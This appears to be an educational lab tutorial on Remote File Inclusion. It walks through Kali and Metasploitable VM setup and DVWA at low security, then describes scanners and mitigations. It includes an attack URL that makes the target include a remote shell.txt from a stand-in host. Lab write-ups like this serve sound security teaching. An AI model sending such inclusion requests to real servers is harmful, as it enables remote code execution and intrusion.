# Testing for RFI (Remote File Inclusion)

<p>
<strong>Remote File Inclusion (RFI) is a type of web vulnerability that allows an attacker to include a remote file, typically through a script on the web server. This vulnerability occurs when a web application allows user input to dictate what files are included in the server-side code execution. The included file can be any type, such as a script, image, or document, that resides on a remote server.</strong>
</p>
<h3>How RFI Works</h3>


<ol>

<li><strong>User Input: </strong>The web application takes user input, which specifies the location of a file to be included.

<li><strong>File Inclusion: </strong>The application does not properly validate or sanitize this input, allowing for the inclusion of files from remote servers.

<li><strong>Remote File Execution: </strong>The web server fetches and executes the file from the remote location.
</li>
</ol>
<h3>Setting Up the Environment</h3>


<h4>1. Install VirtualBox</h4>


<p>
<strong>Download and install<a href="https://www.virtualbox.org/"> VirtualBox</a> on your host machine.</strong>
</p>
<h4>2. Set Up Kali Linux VM</h4>


<ol>

<li><strong>Download <a href="https://www.kali.org/">Kali Linux</a>: </strong>Get the latest version from Kali Linux Downloads.

<li><strong>Create a New Virtual Machine:</strong> 
<ul>
 
<li>Open VirtualBox and click "New".
 
<li>Name: Kali Linux
 
<li>Type: Linux
 
<li>Version: Ubuntu (64-bit)
</li> 
</ul>

<li><strong>Allocate Resources:</strong> 
<ul>
 
<li>Memory: Allocate at least 2 GB of RAM.
 
<li>Hard Disk: Create a virtual hard disk (20 GB recommended).
</li> 
</ul>

<li><strong>Install Kali Linux:</strong> 
<ul>
 
<li>Start the VM and select the Kali Linux ISO as the startup disk.
 
<li>Follow the on-screen instructions to complete the installation.
</li>
 <br/>
<img src="https://imgur.com/LSk89Vc.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />
</ul>
</li> 
</ol>
<p>







</p>
<h4>3. Set Up Metasploitable VM</h4>


<ol>

<li><strong>Download <a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download">Metasploitable</a>: </strong>Get the VM from SourceForge.

<li><strong>Create a New Virtual Machine:</strong> 
<ul>
 
<li>Name: Metasploitable
 
<li>Type: Linux
 
<li>Version: Ubuntu (32-bit)
</li> 
</ul>

<li><strong>Allocate Resources:</strong> 
<ul>
 
<li>Memory: Allocate at least 512 MB of RAM.
 
<li>Hard Disk: Use an existing virtual hard disk and select the downloaded Metasploitable VMDK file.
</li> 
</ul>

<li><strong>Start Metasploitable:</strong> 
<ul>
 
<li>Ensure network settings are set to Host-only Adapter.
</li> 
 <br/>
<img src="https://imgur.com/luL7HIn.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />

</ul>
</li> 
</ol>
<p>




</p>
<h3>Testing RFI on DVWA</h3>


<h4>4. Set Up DVWA on Metasploitable</h4>


<p>
<strong>Ensure the following setups are completed:</strong>
</p>
<ol>

<li><strong>Start Metasploitable VM</strong>: 
<ul>
 
<li>Log in with credentials (username: msfadmin, password: msfadmin).
</li> 
</ul>

<li><strong>Find Metasploitable IP</strong>: 
<ul>
 
<li>Run the command ifconfig in Metasploitable to get the IP address.
 
<li>Note the IP address, e.g., 192.168.56.101.
</li> 
</ul>

<li><strong>Start Kali Linux VM</strong> 
<ul>
 
<li>Open a web browser in Kali Linux.
 
<li>Enter the Metasploitable IP into the search bar and hit enter
 
<li>Select DVWA (Damn Vulnerable Web Application)
</li> 
 <br/>
<img src="https://imgur.com/UgS2Mq0.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />

</ul>
</li> 
</ol>
<p>




</p>
<h4>5. Configure DVWA</h4>


<ol>

<li>Log In: Default credentials (admin // password).
</li>
 <br/>
<img src="https://imgur.com/RuHXLLS.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />

</ol>
<p>




</p>
<ol>

<li>Set Security Level: 

<li>Navigate to DVWA Security under the left-side menu.

<li>Set the security level to Low.

<li>Click "Submit" to save changes.
</li>
 <br/>
<img src="https://imgur.com/Hz17ghA.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />

</ol>
<p>




</p>
<p>
<strong>3. Navigate to the File Inclusion Page:</strong>
</p>
<ul>

<li><strong>Select File Inclusion.</strong>
</li>
 <br/>
<img src="https://imgur.com/jHW1AYq.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />

</ul>
<p>




</p>
<ol>

<li><strong>Test for RFI:</strong>

<li><strong>In the URL bar, modify the parameter to include a remote file.</strong>

<li><strong>Original URL: http://192.168.1.250/dvwa/vulnerabilities/fi/?page=include.php</strong>

<li><strong>Test URL: http://192.168.1.250/dvwa/vulnerabilities/fi/?page=http://example.com/shell.txt</strong>
</li>
 <br/>
<img src="https://imgur.com/D0IP5J3.png" height="80%" width="80%" alt="Building Home Network Steps"/>
<br />

</ol>
<p>




</p>
<h4>Automated RFI Testing</h4>


<h4>1. Acunetix</h4>


<p>
Overview: Acunetix is a comprehensive web vulnerability scanner that detects a wide range of vulnerabilities, including RFI. It offers automated scanning capabilities and detailed reporting.
</p>
<p>
<strong>Features:</strong>
</p>
<ul>

<li>Scans for RFI, SQL injection, XSS, and other vulnerabilities.

<li>Provides detailed reports with remediation advice.

<li>Supports both black-box and gray-box testing.
</li>
</ul>
<p>
<strong>Usage:</strong>
</p>
<ol>

<li>Install Acunetix on your machine or use the online version.

<li>Set up a new scan target by entering the URL of the web application (e.g., http://192.168.56.101/dvwa).

<li>Start the scan and monitor the progress.

<li>Review the results for RFI vulnerabilities.
</li>
</ol>
<p>
<strong>2. OWASP ZAP (Zed Attack Proxy)</strong>
</p>
<p>
Overview: OWASP ZAP is an open-source web application security scanner maintained by the OWASP community. It helps in finding security vulnerabilities in web applications.
</p>
<p>
<strong>Features:</strong>
</p>
<ul>

<li>Automated scanner as well as a set of tools for finding security vulnerabilities manually.

<li>Intercepting proxy for inspecting and modifying requests and responses.

<li>Spidering to discover the content and structure of the website.
</li>
</ul>
<p>
<strong>Usage:</strong>
</p>
<ol>

<li>Install OWASP ZAP on Kali Linux.

<li>Open OWASP ZAP and set the target URL to http://192.168.56.101/dvwa.

<li>Start the scan and monitor the results.
</li>
</ol>
<h3>Recommendations and Mitigation Techniques for Remote File Inclusion (RFI)</h3>


<p>
To protect web applications from Remote File Inclusion (RFI) vulnerabilities, it is essential to implement a combination of secure coding practices, proper configuration settings, and regular security assessments. Here are some recommendations and mitigation techniques:
</p>
<p>
<strong>1. Input Validation and Sanitization</strong> - Ensure all user inputs are properly validated and sanitized to prevent malicious data from being processed by the application.
</p>
<p>
<strong>2. Disable URL File Inclusions - </strong>Prevent the inclusion of remote files by disabling URL file includes in the server configuration.
</p>
<p>
<strong>3. Regular Code Reviews and Security Audits - </strong>Conduct periodic code reviews and security audits to identify and fix potential RFI vulnerabilities.
</p>
<p>
<strong>4. Employ Web Application Firewalls (WAFs) - </strong>Utilize Web Application Firewalls to detect and block malicious requests attempting to exploit RFI vulnerabilities.
</p>
